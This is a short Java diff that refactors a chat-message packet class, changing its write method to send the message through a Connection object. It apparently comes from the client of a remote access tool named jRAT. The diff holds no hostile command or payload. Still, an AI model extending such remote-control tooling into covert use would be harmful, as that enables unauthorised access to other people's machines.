@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet35ChatMessage extends AbstractOutgoingPacket {
@@ -13,8 +12,8 @@ public class Packet35ChatMessage extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(this.message);
+	public void write(Connection con) throws Exception {
+		con.writeLine(this.message);
 	}
 
 	@Override
